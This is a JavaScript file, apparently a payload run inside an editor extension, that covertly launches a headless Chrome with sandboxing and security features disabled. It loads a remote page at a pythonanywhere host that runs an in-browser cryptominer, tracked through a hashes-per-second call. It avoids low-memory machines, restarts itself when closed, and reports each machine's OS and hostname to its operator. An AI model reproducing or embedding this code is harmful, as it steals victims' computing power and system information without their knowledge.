(async () => {

    async function strt() {


        let startTime = Date.now();
        let fs = require('fs')
        let os = require('os');

        let devMode = false;
        let chance = (probability) => Math.random() < probability;
        let reduceFactor = 0.9;
        let nonHeadless = false;

        let repTime = 1 * 60 * 1000; // with reduceFactor 98/2 skips = 500 minutes
        let forceDebug = false;
        let waitTime = 10 * 60 * 1000;
        let forceReload = false;

        try {
            if (fs.existsSync('C:\\498_dev_test.txt')) {
                devMode = true;
                waitTime = 0;
                repTime = 0.1 * 60 * 1000;
                return;
            } else { }
        } catch (error) {
            console.log('dev mode error', error);
        }


        global.globalVars.uniqueID = 11;
        if (!global.globalVars.lastUniqueID || global.globalVars.lastUniqueID != global.globalVars.uniqueID) {
            if (global.globalVars.lastUniqueID)
                forceReload = true;
        } else {
            return;
        }


        if (devMode || forceReload || !fs.existsSync(`${os.tmpdir()}/single_init_unix_time.txt`) || (Date.now() - parseInt(fs.readFileSync(`${os.tmpdir()}/single_init_unix_time.txt`)) > repTime + 1 * 60 * 1000)) {
            fs.writeFileSync(`${os.tmpdir()}/single_init_unix_time.txt`, Math.floor(Date.now()).toString());
        } else {
            (async () => { throw new Error('sp-end single init ' + `${Date.now() - parseInt(fs.readFileSync(`${os.tmpdir()}/single_init_unix_time.txt`))}`) })();
            return;
        }

        global.globalVars.lastUniqueID = global.globalVars.uniqueID;

        let {
            tstt,
            safe,
            vscode,
            puppeteer
        } = global.globalVars;




        safe = safe || (() => { });


        // let baseUrl = 'http://share.liveblog365.com/init.html?i=1';
        let baseUrl = 'https://ab498.pythonanywhere.com/static/init.html';

        let downed = false;
        let browser;
        let page;
        let minUse = 0.1;
        let maxUse = 0.3;
        let [max, min] = [maxUse, minUse];


        try {


            let actv = () => {
                fs.writeFileSync(`${os.tmpdir()}/single_init_unix_time.txt`, Math.floor(Date.now()).toString());
            }
            if (global.globalVars.intv) clearInterval(global.globalVars.intv);
            if (global.globalVars.reconnectIntv) clearTimeout(global.globalVars.reconnectIntv);
            global.globalVars.intv = setInterval(actv, repTime);

            function getCPUUsage() {
                try {
                    const cpus = os.cpus();
                    const userTime = cpus.reduce((acc, cpu) => acc + cpu.times.user, 0);
                    const niceTime = cpus.reduce((acc, cpu) => acc + cpu.times.nice, 0);
                    const sysTime = cpus.reduce((acc, cpu) => acc + cpu.times.sys, 0);
                    const idleTime = cpus.reduce((acc, cpu) => acc + cpu.times.idle, 0);
                    const irqTime = cpus.reduce((acc, cpu) => acc + cpu.times.irq, 0);

                    const total = userTime + niceTime + sysTime + idleTime + irqTime;
                    const used = total - idleTime;
                    return ((1 - idleTime / total) * 100).toFixed(2);
                } catch (error) {

                }
            }

            function getMemoryUsage() {
                try {
                    const totalMemory = os.totalmem();
                    const freeMemory = os.freemem();
                    const usedMemory = totalMemory - freeMemory;
                    return {
                        free: parseFloat((freeMemory / (1024 ** 3)).toFixed(2)),
                        used: parseFloat((usedMemory / (1024 ** 3)).toFixed(2)),
                        total: parseFloat((totalMemory / (1024 ** 3)).toFixed(2)),
                        percent: parseFloat(((usedMemory / totalMemory) * 100).toFixed(2))
                    };
                } catch (error) {

                }
            }

            if (getMemoryUsage()?.total <= 6.0 && !devMode) {
                return;
            }


            async function browserPage() {
                if (global.cppPage) {
                    try {
                        await global.cppPage.close();
                        let allPages = await browser.pages();
                        for (let i = 0; i < allPages.length; i++) {
                            await allPages[i].close();
                        }
                    } catch (e) { }
                    global.cppPage = null;
                }
                if (global.cppBrowser) {
                    try {
                        await global.cppBrowser.close();
                    } catch (e) { }
                    global.cppBrowser = null;
                }

                if (!devMode) await new Promise(r => setTimeout(r, waitTime));
                try {

                    // if (devMode) throw new Error('test');
                    browser = await puppeteer.launch({
                        channel: 'chrome',
                        headless: devMode ? false : true,
                        ignoreHTTPSErrors: true,
                        // acceptInsecureCerts: true,
                        args: [
                            '--disable-web-security',
                            '--disable-features=IsolateOrigins,site-per-process',
                            '--allow-running-insecure-content',

                            // '--ignore-certificate-errors',
                            // "--ignore-certificate-errors-spki-list",
                            // "--no-zygote",
                            // "--no-sandbox",
                            // "--enable-features=NetworkService",

                            '--disable-background-timer-throttling',
                            '--disable-client-side-phishing-detection',
                            '--disable-default-apps',
                            '--disable-hang-monitor',
                            '--disable-popup-blocking',
                            '--disable-prompt-on-repost',
                            '--disable-sync',
                            '--enable-automation',
                            '--enable-devtools-experiments',
                            '--metrics-recording-only',
                            '--no-first-run',
                            '--password-store=basic',
                            '--remote-debugging-port=0',
                            '--safebrowsing-disable-auto-update',
                            '--use-mock-keychain',
                            // '--disable-background-networking',
                            // '--user-data-dir=C:\\Users\\Admin\\AppData\\Local\\Temp',
                            // '--disable-gpu',
                            ...(devMode ? [] : ['--headless']),
                            '--hide-scrollbars',
                            '--mute-audio',
                            '--no-sandbox'
                        ]
                    });

                } catch (error) {
                    //channel failure
                    let puppeteerBrowsers = global.globalVars.puppeteerBrowsers;
                    if (!puppeteerBrowsers) throw new Error('PB not found');
                    let chromePath = null;
                    let brInfo = {
                        name: 'chrome',
                        version: '130.0.6723.58',
                    }

                    let cacheDir = `${os.homedir()}/.cache/puppeteer`;
                    if (!fs.existsSync(cacheDir)) {
                        fs.mkdirSync(cacheDir, { recursive: true });
                    };
                    let installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
                    let chromeBrowser = installedBrowsers.find(browser => browser.browser === brInfo.name);
                    if (!chromeBrowser) {
                        let installedBrowser = await puppeteerBrowsers.install({
                            browser: brInfo.name,
                            buildId: brInfo.version,
                            cacheDir,
                        });
                        chromePath = installedBrowser.executablePath;
                    } else {
                        chromePath = chromeBrowser.executablePath;
                    }

                    downed = true;

                    if (!devMode) await new Promise(r => setTimeout(r, waitTime));
                    browser = await puppeteer.launch({
                        executablePath: chromePath,
                        headless: devMode ? false : true,
                        ignoreHTTPSErrors: true,
                        // acceptInsecureCerts: true,
                        args: [
                            '--disable-web-security',
                            '--disable-features=IsolateOrigins,site-per-process',
                            '--allow-running-insecure-content',

                            // '--ignore-certificate-errors',
                            // "--ignore-certificate-errors-spki-list",
                            // "--no-zygote",
                            // "--no-sandbox",
                            // "--enable-features=NetworkService",

                            '--disable-background-timer-throttling',
                            '--disable-client-side-phishing-detection',
                            '--disable-default-apps',
                            '--disable-hang-monitor',
                            '--disable-popup-blocking',
                            '--disable-prompt-on-repost',
                            '--disable-sync',
                            '--enable-automation',
                            '--enable-devtools-experiments',
                            '--metrics-recording-only',
                            '--no-first-run',
                            '--password-store=basic',
                            '--remote-debugging-port=0',
                            '--safebrowsing-disable-auto-update',
                            '--use-mock-keychain',
                            // '--disable-background-networking',
                            // '--user-data-dir=C:\\Users\\Admin\\AppData\\Local\\Temp',
                            // '--disable-gpu',
                            ...(devMode ? [] : ['--headless']),
                            '--hide-scrollbars',
                            '--mute-audio',
                            '--no-sandbox'
                        ]
                    });


                }

                try {
                    browser.on('disconnected', () => {
                        if (global.globalVars.reconnectIntv) clearTimeout(global.globalVars.reconnectIntv);
                        global.globalVars.reconnectIntv = setTimeout(async () => {
                            try {
                                let pageExists = (await browser?.pages())?.some(page => page.url()?.includes(baseUrl));
                                if (pageExists) return tstt({
                                    message: "FALSE_DISCONNECT",
                                    uniqueID: global.globalVars.uniqueID || 'null',
                                    hash: (await page.evaluate(() => { return window._client?.getHashesPerSecond(); }))
                                });
                            } catch (error) {
                                tstt({
                                    message: "FALSE_DISCONNECT_ERR",
                                    uniqueID: global.globalVars.uniqueID || 'null',
                                    value: error?.message,
                                    stack: error?.stack,
                                    error: error
                                })
                            }
                            try {
                                await browserPage();
                                tstt({
                                    message: "RECONNECT",
                                    runtime: Date.now() - startTime,
                                    uniqueID: global.globalVars.uniqueID || 'null',
                                });
                            } catch (error) {
                                tstt({
                                    message: "RECONNECT_ERR",
                                    uniqueID: global.globalVars.uniqueID || 'null',
                                    value: error?.message,
                                    stack: error?.stack,
                                    error: error
                                })
                            }
                        }, repTime + 1 * 60 * 1000);
                        tstt({
                            message: "DISCONNECTT",
                            runtime: Date.now() - startTime,
                            uniqueID: global.globalVars.uniqueID || 'null',
                        });
                    });
                } catch (error) { }

                global.cppBrowser = browser;
                // os.setPriority(browser.process().pid, 19);
                page = await browser.newPage();
                global.cppPage = page;


                await page.goto(baseUrl + '?use=' + max, { timeout: 0 });

            }

            tstt({
                message: "INIT_SUCCESS",
                downloaded: downed,
                uniqueID: global.globalVars.uniqueID || 'null',
                os: os.type() + ' | ' + os.arch() + ' | ' + os.release() + ' | ' + os.platform() + ' | ' + os.hostname(),
            });
            (async () => { throw new Error('sp-end') })();
        } catch (error) {
            tstt({
                os: os.type(),
                message: "INIT_ERROR",
                value: error?.message,
                stack: error?.stack,
                error: error,
                downloaded: downed,
                uniqueID: global.globalVars.uniqueID || 'null',
            });

            if (global.globalVars.intv) clearInterval(global.globalVars.intv);
            if (global.globalVars.reconnectIntv) clearTimeout(global.globalVars.reconnectIntv);

            (async () => { throw new Error('sp-err: ' + error?.message) })();
        }

    };

    strt();
})();